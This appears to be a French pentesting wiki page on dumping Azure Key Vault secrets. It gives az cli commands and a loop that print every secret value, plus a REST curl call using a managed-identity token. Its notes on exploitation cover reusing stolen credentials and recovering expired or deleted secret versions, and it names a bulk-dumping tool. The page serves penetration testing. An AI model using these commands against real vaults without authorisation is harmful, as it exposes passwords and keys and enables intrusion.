---
title: "Secrets : déverser les valeurs des secrets Key Vault"
order: 1
description: "Déverser les secrets d'un Azure Key Vault avec get et list sur le plan de données du coffre."
keywords:
  - Key Vault
  - secrets
  - get secret
  - list secrets
  - plan de données
---

# Secrets

Les secrets Key Vault contiennent des mots de passe, des chaînes de connexion et des clés d'API sous forme de valeurs en clair que le coffre retourne à la lecture. Avec un rôle de plan de données (`Key Vault Secrets User`/`Officer`) ou une stratégie d'accès octroyant `get`/`list`, vous les énumérez et les déversez tous.

## Lister et déverser

```bash
az keyvault secret list --vault-name <vault> --query '[].id' -o tsv
az keyvault secret show --vault-name <vault> --name <secret> --query value -o tsv

# sweep every readable secret
for s in $(az keyvault secret list --vault-name <vault> --query '[].name' -o tsv); do
  echo "== $s =="; az keyvault secret show --vault-name <vault> --name "$s" --query value -o tsv
done
```

Avec seulement un jeton brut d'identité managée pour `https://vault.azure.net`, interrogez directement le plan de données REST :

```bash
curl -s -H "Authorization: Bearer $KV_TOKEN" \
  "https://<vault>.vault.azure.net/secrets?api-version=7.4"
```

## Notes d'exploitation

- Lire un secret ne le fait pas tourner, de sorte que les identifiants de base de données et tiers récupérés continuent de fonctionner.
- Les versions de secret désactivées ou expirées retournent souvent encore leur valeur via l'URI versionnée, ce qui est utile après une rotation.
- Un secret en suppression réversible peut être récupéré depuis l'état supprimé si la protection contre le purge ne l'a pas retiré (`az keyvault secret list-deleted`).

## Outils

- **az cli** (`keyvault secret`).
- **MicroBurst** (`Get-AzKeyVaultSecrets` via `Get-AzPasswords`) : déversement en masse des coffres.

## Références

- [Microsoft : secrets Key Vault](https://learn.microsoft.com/azure/key-vault/secrets/about-secrets)
- [HackTricks Cloud : Azure Key Vault](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [NetSPI : MicroBurst](https://github.com/NetSPI/MicroBurst)
